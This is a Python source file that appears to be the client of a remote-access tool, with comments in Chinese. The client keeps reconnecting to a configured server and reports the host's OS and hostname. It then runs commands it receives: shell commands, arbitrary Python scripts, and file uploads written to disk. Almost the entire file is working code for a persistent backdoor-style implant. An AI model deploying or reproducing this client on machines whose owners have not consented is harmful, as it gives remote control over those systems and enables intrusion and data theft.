import inspect
import json
import os
import platform
import socket
import sys
import time

from client.command import Command
from client.config import SERVER_ADDR
from client.server import Server
from common.util import parse, logger


class Client:
    def __init__(self, address):
        # 服务端地址
        self.address = address
        # 服务端套接字
        self.server = Server()

    def connect(self):
        """ 连接服务端 """
        # 连接失败等待5秒后重新连接
        while not self.server.connect(self.address):
            time.sleep(5)
        # 发送客户端信息
        info = {
            # 操作系统
            'os': platform.platform(),
            # 主机名
            'hostname': socket.gethostname()
        }
        self.server.send_result(1, json.dumps(info))

    def wait_for_cmd(self):
        """ 等待命令 """
        while True:
            try:
                # 从服务端接收命令
                head, body = self.server.recv()
                try:
                    # 执行命令
                    if head['type'] == 'command':
                        result = self.exec_cmd(body.decode())
                    # 执行python脚本
                    elif head['type'] == 'script':
                        result = Command.pyexec(body.decode(), json.loads(head['args']))
                    # 保存文件
                    elif head['type'] == 'file':
                        with open(head['filename'], 'wb') as file:
                            file.write(body)
                        result = 1, 'File uploaded to: {}'.format(os.path.abspath(head['filename']))
                    else:
                        result = None
                    # 发送执行结果
                    if result:
                        self.server.send_result(*result)
                except Exception as e:
                    self.server.send_result(0, str(e))
                # 发送当前工作目录的路径
                self.server.send_result(1, os.getcwd())
            except SystemExit:
                break
            # 连接断开
            except socket.error:
                # 关闭套接字
                self.server.close()
                # 重新创建套接字
                self.server = Server()
                # 重新连接
                self.connect()

    def exec_cmd(self, command):
        """ 执行命令 """
        cmd = Command()
        # 关闭连接
        if command == 'kill':
            # self.server.close()
            sys.exit(0)
        # 将收到的命令拆分成命令名和参数
        name, arg = parse(command)
        if hasattr(cmd, name):
            # 通过命令名获取函数
            func = getattr(cmd, name)
            # 获取函数的参数
            args = inspect.getfullargspec(func).args
            # 获取函数的参数个数
            argc = len(args)
            # 如果函数没有参数
            if not argc:
                # 调用函数并发送命令执行结果
                return func()
            # 如果函数需要传入服务端套接字
            elif 'server' in args:
                # 函数只需要传入服务端套接字
                if argc == 1:
                    func(self.server)
                # 函数需要传入服务端套接字和命令参数
                else:
                    func(self.server, arg)
            # 如果函数有参数但不是服务端套接字
            else:
                # 将命令参数传给该函数，调用函数并发送命令执行结果
                return func(arg)
        else:
            # 执行shell命令
            return cmd.shell(command)


if __name__ == '__main__':
    client = Client(SERVER_ADDR)
    try:
        client.connect()
        client.wait_for_cmd()
    except KeyboardInterrupt:
        sys.exit(0)
    except Exception as e:
        logger.error(e)